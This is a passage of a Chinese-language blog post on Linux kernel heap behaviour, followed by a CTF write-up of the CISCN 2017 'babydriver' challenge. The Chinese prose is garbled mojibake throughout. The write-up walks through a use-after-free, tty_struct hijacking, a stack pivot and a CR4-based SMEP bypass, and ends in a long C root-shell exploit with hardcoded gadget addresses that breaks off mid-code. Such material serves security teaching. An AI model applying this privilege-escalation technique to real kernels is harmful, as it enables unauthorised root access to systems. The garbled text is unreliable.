<li>å¯¹äºå¼€å¯äº† <code>CONFIG_MEMCG_KMEM</code> ç¼–è¯‘é€‰é¡¹çš„ kernel è€Œè¨€ï¼ˆé€šå¸¸éƒ½æ˜¯é»˜è®¤å¼€å¯ï¼‰ï¼Œå…¶ä¼šä¸ºä½¿ç”¨ <code>GFP_KERNEL_ACCOUNT</code> è¿›è¡Œåˆ†é…çš„é€šç”¨å¯¹è±¡<strong>åˆ›å»ºä¸€ç»„ç‹¬ç«‹çš„ <code>kmem_cache</code> â€”â€”åä¸º <code>kmalloc-cg-*</code></strong> ï¼Œä»è€Œå¯¼è‡´ä½¿ç”¨è¿™ä¸¤ç§ flag çš„ object ä¹‹é—´çš„éš”ç¦»ï¼š</li>
</ul>
<p><img src="https://s2.loli.net/2023/01/10/bLIr8nOUw4PjStx.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<h2 id="Pre3-slub-åˆå¹¶-amp-éš”ç¦»"><a href="#Pre3-slub-åˆå¹¶-amp-éš”ç¦»" class="headerlink" title="Pre3. slub åˆå¹¶ &amp; éš”ç¦»"></a>Pre3. slub åˆå¹¶ &amp; éš”ç¦»</h2><p>slab alias æœºåˆ¶æ˜¯ä¸€ç§å¯¹åŒç­‰&#x2F;ç›¸è¿‘å¤§å° object çš„ <code>kmem_cache</code> è¿›è¡Œ<strong>å¤ç”¨</strong>çš„ä¸€ç§æœºåˆ¶ï¼š</p>
<ul>
<li>å½“ä¸€ä¸ª <code>kmem_cache</code> åœ¨åˆ›å»ºæ—¶ï¼Œè‹¥å·²ç»å­˜åœ¨èƒ½åˆ†é…ç›¸ç­‰&#x2F;è¿‘ä¼¼å¤§å°çš„ object çš„ <code>kmem_cache</code> ï¼Œåˆ™<strong>ä¸ä¼šåˆ›å»ºæ–°çš„ kmem_cacheï¼Œè€Œæ˜¯ä¸ºåŸæœ‰çš„ kmem_cache èµ·ä¸€ä¸ª aliasï¼Œä½œä¸ºâ€œæ–°çš„â€ kmem_cache è¿”å›</strong></li>
</ul>
<p>ä¸¾ä¸ªğŸŒ°ï¼Œ<code>cred_jar</code> æ˜¯ä¸“é—¨ç”¨ä»¥åˆ†é… <code>cred</code> ç»“æ„ä½“çš„ <code>kmem_cache</code>ï¼Œåœ¨ Linux 4.4 ä¹‹å‰çš„ç‰ˆæœ¬ä¸­ï¼Œå…¶ä¸º <code>kmalloc-192</code> çš„ aliasï¼Œå³ cred ç»“æ„ä½“ä¸å…¶ä»–çš„ 192 å¤§å°çš„ object éƒ½ä¼šä»åŒä¸€ä¸ª <code>kmem_cache</code>â€”â€”<code>kmalloc-192</code> ä¸­åˆ†é…</p>
<p>å¯¹äºåˆå§‹åŒ–æ—¶è®¾ç½®äº† <code>SLAB_ACCOUNT</code> è¿™ä¸€ flag çš„ <code>kmem_cache</code> è€Œè¨€ï¼Œåˆ™ä¼šæ–°å»ºä¸€ä¸ªæ–°çš„ <code>kmem_cache</code> è€Œéä¸ºåŸæœ‰çš„å»ºç«‹ aliasï¼ŒğŸŒ°å¦‚åœ¨æ–°ç‰ˆçš„å†…æ ¸å½“ä¸­ <code>cred_jar</code> ä¸ <code>kmalloc-192</code> ä¾¿æ˜¯ä¸¤ä¸ªç‹¬ç«‹çš„ <code>kmem_cache</code>ï¼Œ<strong>å½¼æ­¤ä¹‹é—´äº’ä¸å¹²æ‰°</strong></p>
<h2 id="ä¾‹é¢˜ï¼šCISCN-2017-babydriver"><a href="#ä¾‹é¢˜ï¼šCISCN-2017-babydriver" class="headerlink" title="ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver"></a>ä¾‹é¢˜ï¼šCISCN - 2017 - babydriver</h2><blockquote>
<p>å¯ä»¥è¯´æ˜¯æœ€æœ€æœ€æœ€æœ€æœ€æœ€ç»å…¸ï¼ˆå…¸ä¸­å…¸ä¸­å…¸ä¸­å…¸ä¸­å…¸ï¼‰çš„ kernel pwn å…¥é—¨é¢˜</p>
<p><a href="/download/ciscn2017/pwn/babydriver.tar.gz" title="ç‚¹æ­¤ä¸‹è½½åŸé¢˜é™„ä»¶">ç‚¹å‡»ä¸‹è½½-babydriver.tar.gz</a></p>
</blockquote>
<p>è§£å‹ï¼Œæƒ¯ä¾‹çš„<code>ç£ç›˜é•œåƒ + å†…æ ¸é•œåƒ + å¯åŠ¨è„šæœ¬</code>ç»“æ„</p>
<p>æŸ¥çœ‹<code>boot.sh</code>ï¼š<del>å†™çš„å¥½ä¹±å•Š</del>ï¼ˆ<del>æ¼</del>ï¼‰</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>qemu-system-x86_64 -initrd core.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;  -monitor /dev/null -m 128M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s<br></code></pre></td></tr></table></figure>

<ul>
<li>å¼€å¯äº†SMEPä¿æŠ¤</li>
</ul>
<p>è§£å‹ç£ç›˜é•œåƒçœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ä¸œè¥¿</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cp</span> ./core.cpio ./core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">cpio -idv &lt; ./core.cpio</span><br></code></pre></td></tr></table></figure>

<p>æŸ¥çœ‹å…¶å¯åŠ¨è„šæœ¬<code>init</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-meta">#!/bin/sh</span><br><br>mount -t proc none /proc<br>mount -t sysfs none /sys<br>mount -t devtmpfs devtmpfs /dev<br><span class="hljs-built_in">chown</span> root:root flag<br><span class="hljs-built_in">chmod</span> 400 flag<br><span class="hljs-built_in">exec</span> 0&lt;/dev/console<br><span class="hljs-built_in">exec</span> 1&gt;/dev/console<br><span class="hljs-built_in">exec</span> 2&gt;/dev/console<br><br>insmod /lib/modules/4.4.72/babydriver.ko<br><span class="hljs-built_in">chmod</span> 777 /dev/babydev<br><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\nBoot took <span class="hljs-subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds\n&quot;</span><br>setsid cttyhack setuidgid 1000 sh<br><br>umount /proc<br>umount /sys<br>poweroff -d 0  -f<br></code></pre></td></tr></table></figure>

<p>å…¶ä¸­åŠ è½½äº†ä¸€ä¸ªå«åš<code>babydriver.ko</code>çš„é©±åŠ¨ï¼ŒæŒ‰ç…§æƒ¯ä¾‹è¿™ä¸ªå°±æ˜¯æœ‰ç€æ¼æ´çš„é©±åŠ¨</p>
<h4 id="â‘ -é€†å‘åˆ†æ"><a href="#â‘ -é€†å‘åˆ†æ" class="headerlink" title="â‘  é€†å‘åˆ†æ"></a>â‘  é€†å‘åˆ†æ</h4><p>æƒ¯ä¾‹çš„<code>checksec</code>ï¼Œå‘ç°å…¶åªå¼€äº†NXä¿æŠ¤ï¼Œ<del>æ•´æŒºå¥½</del></p>
<p><img src="https://i.loli.net/2021/03/03/eyaFXu2CQ3mwAg4.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p>åœ¨é©±åŠ¨è¢«åŠ è½½æ—¶ä¼šåˆå§‹åŒ–ä¸€ä¸ªè®¾å¤‡èŠ‚ç‚¹æ–‡ä»¶<code>/dev/babydev</code></p>
<p><img src="https://i.loli.net/2021/03/03/pYZeduBDUzfayK9.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨æˆ‘ä»¬ä½¿ç”¨open()æ‰“å¼€è®¾å¤‡æ–‡ä»¶æ—¶è¯¥é©±åŠ¨ä¼šåˆ†é…ä¸€ä¸ªchunkï¼Œ<strong>è¯¥chunkçš„æŒ‡é’ˆå‚¨å­˜äºå…¨å±€å˜é‡</strong><code>babydev_struct</code>ä¸­</p>
<p><img src="https://i.loli.net/2021/03/03/yvjCraBZLeVb4NG.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>ä½¿ç”¨<code>ioctl</code>è¿›è¡Œé€šä¿¡åˆ™å¯ä»¥é‡æ–°ç”³è¯·å†…å­˜ï¼Œæ”¹å˜è¯¥chunkçš„å¤§å°</p>
<p><img src="https://i.loli.net/2021/03/03/Z5sSkiez27yN9EA.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>åœ¨å…³é—­è®¾å¤‡æ–‡ä»¶æ—¶ä¼š<strong>é‡Šæ”¾è¯¥chunkï¼Œä½†æ˜¯å¹¶æœªå°†æŒ‡é’ˆç½®NULLï¼Œå­˜åœ¨UAFæ¼æ´</strong></p>
<p><img src="https://i.loli.net/2021/03/03/ehPoXGFKJ71Dwfl.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>readå’Œwriteå°±æ˜¯ç®€å•çš„è¯»å†™è¯¥chunkï¼Œä¾¿ä¸è´´å›¾äº†</p>
<h4 id="â‘¡-æ¼æ´ç‚¹"><a href="#â‘¡-æ¼æ´ç‚¹" class="headerlink" title="â‘¡ æ¼æ´ç‚¹"></a>â‘¡ æ¼æ´ç‚¹</h4><p>è‹¥æ˜¯æˆ‘ä»¬çš„ç¨‹åºæ‰“å¼€ä¸¤æ¬¡è®¾å¤‡<code>babydev</code>ï¼Œç”±äºå…¶chunkå‚¨å­˜åœ¨å…¨å±€å˜é‡ä¸­ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†ä¼šè·å¾—<strong>æŒ‡å‘åŒä¸€ä¸ª chunkçš„ä¸¤ä¸ªæŒ‡é’ˆ</strong></p>
<p>è€Œåœ¨å…³é—­è®¾å¤‡åè¯¥ chunk è™½ç„¶è¢«é‡Šæ”¾ï¼Œä½†æ˜¯æŒ‡é’ˆæœªç½®0ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¾¿å¯ä»¥<strong>é€šè¿‡å¦ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦æ“ä½œè¯¥ chunk</strong>ï¼Œå³<strong>å­˜åœ¨ Use After Free æ¼æ´</strong></p>
<h4 id="â‘¢-æ¼æ´åˆ©ç”¨ï¼šKernel-UAF-stack-migitation-SMEP-bypass-ret2usr"><a href="#â‘¢-æ¼æ´åˆ©ç”¨ï¼šKernel-UAF-stack-migitation-SMEP-bypass-ret2usr" class="headerlink" title="â‘¢ æ¼æ´åˆ©ç”¨ï¼šKernel UAF + stack migitation + SMEP bypass + ret2usr"></a>â‘¢ æ¼æ´åˆ©ç”¨ï¼šKernel UAF + stack migitation + SMEP bypass + ret2usr</h4><p>å†…æ ¸ç¬¦å·è¡¨å¯è¯»ï¼ˆç™½ç»™ï¼‰ï¼Œæˆ‘ä»¬èƒ½å¤Ÿå¾ˆæ–¹ä¾¿åœ°è·å¾—ç›¸åº”å†…æ ¸å‡½æ•°çš„åœ°å€</p>
<p><img src="https://i.loli.net/2021/08/01/yloiSIGwWN8U1gq.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ²¡æœ‰å¼€å¯ kaslrï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ä» vmlinux ä¸­æå–gadgetåœ°å€ï¼Œè¿™é‡Œ <strong>ROPgadget å’Œ ropper åŠæ–¤å…«ä¸¤ï¼Œå»ºè®®ä¸¤ä¸ªé…åˆç€ä¸€èµ·ç”¨</strong></p>
<p>ç”±äºå¼€å¯äº† SMEP ä¿æŠ¤ï¼Œæ— æ³•ç›´æ¥ ret2usrï¼Œæ•…æˆ‘ä»¬éœ€è¦æ”¹å˜ cr4 å¯„å­˜å™¨çš„å€¼ä»¥ bypass smep</p>
<p>è§‚å¯Ÿåˆ°åœ¨å†…æ ¸ä¸­æœ‰ç€å¦‚ä¸‹çš„ gadget å¯ä»¥å¾ˆæ–¹ä¾¿åœ°æ”¹å˜ cr4 å¯„å­˜å™¨çš„å€¼ï¼š</p>
<p><img src="https://i.loli.net/2021/03/11/rztYCIH579dc6vu.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•é€šè¿‡ UAF åŠ«æŒç¨‹åºæ‰§è¡Œæµï¼Œè¿™é‡Œæˆ‘ä»¬é€‰æ‹© <code>tty_struct</code> ç»“æ„ä½“ä½œä¸º victim object</p>
<p>åœ¨ <code>/dev</code> ä¸‹æœ‰ä¸€ä¸ªä¼ªç»ˆç«¯è®¾å¤‡ <code>ptmx</code> ï¼Œåœ¨æˆ‘ä»¬æ‰“å¼€è¿™ä¸ªè®¾å¤‡æ—¶å†…æ ¸ä¸­ä¼šåˆ›å»ºä¸€ä¸ª <code>tty_struct</code> ç»“æ„ä½“ï¼Œä¸å…¶ä»–ç±»å‹è®¾å¤‡ç›¸åŒï¼Œttyé©±åŠ¨è®¾å¤‡ä¸­åŒæ ·å­˜åœ¨ç€ä¸€ä¸ªå­˜æ”¾ç€å‡½æ•°æŒ‡é’ˆçš„ç»“æ„ä½“ <code>tty_operations</code></p>
<p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF åŠ«æŒ <code>/dev/ptmx</code> è¿™ä¸ªè®¾å¤‡çš„ <code>tty_struct</code> ç»“æ„ä½“ä¸å…¶å†…éƒ¨çš„ <code>tty_operations</code> å‡½æ•°è¡¨ï¼Œé‚£ä¹ˆåœ¨æˆ‘ä»¬å¯¹è¿™ä¸ªè®¾å¤‡è¿›è¡Œç›¸åº”æ“ä½œï¼ˆå¦‚writeã€ioctlï¼‰æ—¶ä¾¿ä¼šæ‰§è¡Œæˆ‘ä»¬å¸ƒç½®å¥½çš„æ¶æ„å‡½æ•°æŒ‡é’ˆ</p>
<p>ç”±äºæ²¡æœ‰å¼€å¯SMAPä¿æŠ¤ï¼Œæ•…æˆ‘ä»¬å¯ä»¥åœ¨ç”¨æˆ·æ€è¿›ç¨‹çš„æ ˆä¸Šå¸ƒç½®ROPé“¾ä¸<code>fake tty_operations</code>ç»“æ„ä½“</p>
<blockquote>
<p>ç»“æ„ä½“<code>tty_struct</code>ä½äº<code>include/linux/tty.h</code>ä¸­ï¼Œ<code>tty_operations</code>ä½äº<code>include/linux/tty_driver.h</code>ä¸­</p>
</blockquote>
<p>å†…æ ¸ä¸­æ²¡æœ‰ç±»ä¼¼<code>one_gadget</code>ä¸€ç±»çš„ä¸œè¥¿ï¼Œå› æ­¤ä¸ºäº†å®ŒæˆROPæˆ‘ä»¬è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡<strong>æ ˆè¿ç§»</strong></p>
<p>ä½¿ç”¨gdbè¿›è¡Œè°ƒè¯•ï¼Œè§‚å¯Ÿå†…æ ¸åœ¨è°ƒç”¨æˆ‘ä»¬çš„æ¶æ„å‡½æ•°æŒ‡é’ˆæ—¶å„å¯„å­˜å™¨çš„å€¼ï¼Œæˆ‘ä»¬åœ¨è¿™é‡Œé€‰æ‹©åŠ«æŒ<code>tty_operaionts</code>ç»“æ„ä½“åˆ°ç”¨æˆ·æ€çš„æ ˆä¸Šï¼Œå¹¶é€‰æ‹©ä»»æ„ä¸€æ¡å†…æ ¸gadgetä½œä¸ºfake ttyå‡½æ•°æŒ‡é’ˆä»¥æ–¹ä¾¿ä¸‹æ–­ç‚¹ï¼š</p>
<p><img src="https://i.loli.net/2021/03/16/iKBLSsbPT9zcNqQ.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æˆ‘ä»¬ä¸éš¾è§‚å¯Ÿåˆ°ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨<code>tty_operations-&gt;write</code>æ—¶ï¼Œ<strong>å…¶raxå¯„å­˜å™¨ä¸­å­˜æ”¾çš„ä¾¿æ˜¯tty_operationsç»“æ„ä½“çš„åœ°å€</strong>ï¼Œå› æ­¤è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿåœ¨å†…æ ¸ä¸­æ‰¾åˆ°å½¢å¦‚<code>mov rsp, rax</code>çš„gadgetï¼Œä¾¿èƒ½å¤ŸæˆåŠŸåœ°å°†æ ˆè¿ç§»åˆ°<code>tty_operations</code>ç»“æ„ä½“çš„å¼€å¤´</p>
<p>ä½¿ç”¨ROPgadgetæŸ¥æ‰¾ç›¸å…³gadgetï¼Œå‘ç°æœ‰ä¸¤æ¡ç¬¦åˆæˆ‘ä»¬è¦æ±‚çš„gadgetï¼š</p>
<p><img src="https://i.loli.net/2021/03/16/o4c9ryjOBAkit8W.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>gdbè°ƒè¯•ï¼Œå‘ç°ç¬¬ä¸€æ¡gadgetå…¶å®ç­‰ä»·äº<code>mov rsp, rax ; dec ebx ; ret</code>ï¼š</p>
<p><img src="https://i.loli.net/2021/03/16/Qd2sk6TngZa5EDR.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é‚£ä¹ˆåˆ©ç”¨è¿™æ¡gadgetæˆ‘ä»¬ä¾¿å¯ä»¥å¾ˆå¥½åœ°å®Œæˆæ ˆè¿ç§»çš„è¿‡ç¨‹ï¼Œæ‰§è¡Œæˆ‘ä»¬æ‰€æ„é€ çš„ROPé“¾</p>
<p>è€Œ<code>tty_operations</code>ç»“æ„ä½“å¼€å¤´åˆ°å…¶writeæŒ‡é’ˆé—´çš„ç©ºé—´è¾ƒå°ï¼Œå› æ­¤æˆ‘ä»¬è¿˜éœ€è¦è¿›è¡ŒäºŒæ¬¡æ ˆè¿ç§»ï¼Œè¿™é‡Œéšä¾¿é€‰ä¸€æ¡æ”¹raxçš„gadgetå³å¯</p>
<p><img src="https://i.loli.net/2021/03/16/7bROpernV1lSIjs.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>è®¡ç®—ç›¸åº”ç»“æ„ä½“å¤§å°æ—¶åº”å½“é€‰å–ä¸é¢˜ç›®ç›¸åŒç‰ˆæœ¬çš„å†…æ ¸æºç </strong></p>
<h4 id="â‘£-final-exploit"><a href="#â‘£-final-exploit" class="headerlink" title="â‘£ final exploit"></a>â‘£ final exploit</h4><p>æœ€ç»ˆçš„exploitåº”å½“å¦‚ä¸‹ï¼š</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810d238d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RAX_RET 0xffffffff8100ce6e</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_CR4_RDI_POP_RBP_RET 0xffffffff81004d80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RSP_RAX_DEC_EBX_RET 0xffffffff8181bfc5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_POP_RBP_RET 0xffffffff81063694</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> IRETQ_RET 0xffffffff814e35ef</span><br><br><span class="hljs-type">size_t</span> commit_creds = <span class="hljs-literal">NULL</span>, prepare_kernel_cred = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>            <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>            <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>            <span class="hljs-string">&quot;pushf;&quot;</span><br>            <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>            );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootPrivilige</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> * (*prepare_kernel_cred_ptr)(<span class="hljs-type">void</span> *) = prepare_kernel_cred;<br>    <span class="hljs-type">int</span> (*commit_creds_ptr)(<span class="hljs-type">void</span> *) = commit_creds;<br>    (*commit_creds_ptr)((*prepare_kernel_cred_ptr)(<span class="hljs-literal">NULL</span>));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;   <br>    <span class="hljs-keyword">if</span>(getuid())<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Start to exploit...\033[0m\n&quot;</span>);<br>    saveStatus();<br><br>    <span class="hljs-comment">//get the addr</span><br>    FILE* sym_table_fd = fopen(<span class="hljs-string">&quot;/proc/kallsyms&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(sym_table_fd &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Failed to open the sym_table file!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>], type[<span class="hljs-number">0x10</span>];<br>    <span class="hljs-type">size_t</span> addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-built_in">fscanf</span>(sym_table_fd, <span class="hljs-string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, buf))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(prepare_kernel_cred &amp;&amp; commit_creds)<br>            <span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">if</span>(!commit_creds &amp;&amp; !<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            commit_creds = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of commit_cread:\033[0m%llx\n&quot;</span>, commit_creds);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span>(!<span class="hljs-built_in">strcmp</span>(buf, <span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            prepare_kernel_cred = addr;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the addr of prepare_kernel_cred:\033[0m%llx\n&quot;</span>, prepare_kernel_cred);<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x20</span>], p = <span class="hljs-number">0</span>;<br>    rop[p++] = POP_RDI_RET;<br>    rop[p++] = <span class="hljs-number">0x6f0</span>;<br>    rop[p++] = MOV_CR4_RDI_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = getRootPrivilige;<br>    rop[p++] = SWAPGS_POP_RBP_RET;<br>    rop[p++] = <span class="hljs-number">0</span>;<br>    rop[p++] = IRETQ_RET;<br>    rop[p++] = getRootShell;<br>    rop[p++] = user_cs;<br>    rop[p++] = user_rflags;<br>    rop[p++] = user_sp;<br>    rop[p++] = user_ss;<br><br>    <span class="hljs-type">size_t</span> fake_op[<span class="hljs-number">0x30</span>];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x10</span>; i++)<br>        fake_op[i] = MOV_RSP_RAX_DEC_EBX_RET;<br><br>    fake_op[<span class="hljs-number">0</span>] = POP_RAX_RET;<br>    fake_op[<span class="hljs-number">1</span>] = rop;<br><br>    <span class="hljs-type">int</span> fd1 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br>    <span class="hljs-type">int</span> fd2 = open(<span class="hljs-string">&quot;/dev/babydev&quot;</span>, <span class="hljs-number">2</span>);<br><br>    ioctl(fd1, <span class="hljs-number">0x10001</span>, <span class="hljs-number">0x2e0</span>);<br>    close(fd1);<br><br>    <span class="hljs-type">size_t</span> fake_tty[<span class="hljs-number">0x20</span>];<br>    <span class="hljs-type">int</span> fd3 = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, <span class="hljs-number">2</span>);<br>    read(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br>    fake_tty[<span class="hljs-number">3</span>] = fake_op;<br>    write(fd2, fake_tty, <span class="hljs-number">0x40</span>);<br><br>    write(fd3, buf, <span class="hljs-number">0x8</span>);<br><br>    <span 